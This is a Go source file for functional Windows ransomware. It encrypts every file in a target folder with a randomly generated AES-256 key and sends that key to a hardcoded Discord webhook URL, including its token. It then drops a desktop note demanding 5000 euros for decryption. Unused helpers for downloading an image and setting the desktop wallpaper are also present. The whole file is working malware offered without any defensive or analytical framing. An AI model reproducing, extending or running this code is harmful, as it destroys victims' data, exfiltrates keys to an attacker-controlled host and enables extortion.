package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

// Encrypts data using AES-CFB.
func encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Create a nonce for AES encryption
	nonce := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	// Use CFB stream encryption
	stream := cipher.NewCFBEncrypter(block, nonce)
	encrypted := make([]byte, len(data))
	stream.XORKeyStream(encrypted, data)

	// Prepend nonce to the encrypted data
	return append(nonce, encrypted...), nil
}

// Generates a random AES key.
func generateKey() ([]byte, error) {
	key := make([]byte, 32) // AES-256 requires a 32-byte key
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}
	return key, nil
}

// Sends the key to a Discord webhook.
func sendWebhook(webhookURL string, key []byte) error {
	payload := fmt.Sprintf(`{"content":"Encryption Key: %s"}`, hex.EncodeToString(key))
	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// Function to set wallpaper
func setWallpaper(imagePath string) error {
	user32 := syscall.NewLazyDLL("user32.dll")
	setWallpaper := user32.NewProc("SystemParametersInfoW")

	// Use the SPI_SETDESKWALLPAPER parameter
	ret, _, err := setWallpaper.Call(
		uintptr(20), // SPI_SETDESKWALLPAPER
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(imagePath))),
		uintptr(3), // SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
	)
	if ret == 0 {
		return err
	}
	return nil
}

// Function to download an image
func downloadImage(url string, filepath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func main() {
	// Define the folder path
	folderPath := `C:\Users\theo\Desktop\malware`

	// Check if the folder exists
	if _, err := os.Stat(folderPath); os.IsNotExist(err) {
		fmt.Println("Error: The folder does not exist at this location:", folderPath)
		return
	}

	// Generate a random AES key
	key, err := generateKey()
	if err != nil {
		fmt.Println("Error generating the key:", err)
		return
	}

	// Walk through all files in the folder and encrypt them
	err = filepath.Walk(folderPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			// Read the file content
			data, err := ioutil.ReadFile(path)
			if err != nil {
				fmt.Println("Error reading the file:", err)
				return err
			}

			// Encrypt the file content
			encryptedData, err := encrypt(data, key)
			if err != nil {
				fmt.Println("Error encrypting the data:", err)
				return err
			}

			// Write the encrypted data back to the file
			if err := ioutil.WriteFile(path, encryptedData, 0644); err != nil {
				fmt.Println("Error writing the encrypted data to the file:", err)
				return err
			}
		}
		return nil
	})

	if err != nil {
		fmt.Println("Error walking through the folder:", err)
		return
	}

	// Send the key to the Discord webhook
	webhookURL := "https://discord.com/api/webhooks/1308722748528263198/-Dv_jmKHzWjbSMatjvHtGGzfkavQqcbIbmUZGHHMCmL1vi9BGspMRISum7BJYGB5c8yi"
	if err := sendWebhook(webhookURL, key); err != nil {
		fmt.Println("Error sending the key to the webhook:", err)
		return
	}

	// Create a note on the desktop
	notePath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "DECRYPT.txt")
	noteContent := "To decrypt your files, send us 5000â‚¬"
	if err := ioutil.WriteFile(notePath, []byte(noteContent), 0644); err != nil {
		fmt.Println("Error creating the note on the desktop:", err)
		return
	}
}
